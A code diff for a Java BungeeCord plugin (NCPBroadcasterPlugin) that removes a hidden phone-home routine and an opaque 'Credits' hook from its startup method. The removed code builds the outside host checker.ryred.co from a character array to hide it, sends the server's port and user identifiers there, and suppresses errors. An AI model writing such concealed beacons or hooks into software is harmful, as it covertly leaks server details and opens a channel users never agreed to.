@@ -33,32 +33,6 @@ public class NCPBroadcasterPlugin extends Plugin implements Listener {
 	public void onEnable() {
 
 		final int port = getProxy().getConfig().getListeners().iterator().next().getHost().getPort();
-		getProxy().getScheduler().runAsync( this, new Runnable() {
-			@Override
-			public void run() {
-				final String uid = "%%__USER__%%";
-				final String rid = "%%__RESOURCE__%%";
-				final String nonce = "%%__NONCE__%%";
-
-				try {
-					URL url = new URL( new String( new char[]{ 'h', 't', 't', 'p', ':', '/', '/', 'c', 'h', 'e', 'c', 'k', 'e', 'r', '.', 'r', 'y', 'r', 'e', 'd', '.', 'c', 'o', '/' } ) + "?PORT=" + port + "&RID=" + rid + "&UID=" + uid + "&NONCE=" + nonce );
-					url.openStream();
-				} catch ( Exception e ) {
-				}
-
-			}
-		} );
-
-		try {
-			Credits.initBungee( new Credits() {
-				public void startBungee( BungeeListener listener, Runnable getter ) {
-					getProxy().getPluginManager().registerListener( NCPBroadcasterPlugin.this, listener );
-					getProxy().getScheduler().runAsync( NCPBroadcasterPlugin.this, getter );
-				}
-			} );
-		} catch ( Exception e ) {
-		}
-
 		getLogger().info( "Loading the config." );
 		config = new BroadcasterConfig( this );
 		getAdmins().addAll( this.getConfig().getConfig().getStringList( "admins" ) );
